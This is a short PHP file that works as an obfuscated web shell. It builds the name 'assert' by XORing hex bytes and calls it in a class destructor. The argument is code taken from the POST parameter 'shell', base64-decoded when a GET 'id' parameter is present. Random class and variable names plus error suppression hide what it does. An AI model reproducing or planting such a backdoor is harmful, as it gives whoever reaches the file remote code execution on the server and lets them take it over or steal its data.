<?php 
class WIUL { 
    function lRjh() {
        $iKWh = "\x22" ^ "\x43";
        $qeZJ = "\x46" ^ "\x35";
        $sTBK = "\x30" ^ "\x43";
        $bPMh = "\x8" ^ "\x6d";
        $DcNC = "\x60" ^ "\x12";
        $IePj = "\x21" ^ "\x55";
        $ibOI =$iKWh.$qeZJ.$sTBK.$bPMh.$DcNC.$IePj;
        return $ibOI;
    }
    function __destruct(){
        $LUBu=$this->lRjh();
        @$LUBu($this->Ib);
    }
}
$wiul = new WIUL();
@$wiul->Ib = isset($_GET['id'])?base64_decode($_POST['shell']):$_POST['shell'];
?>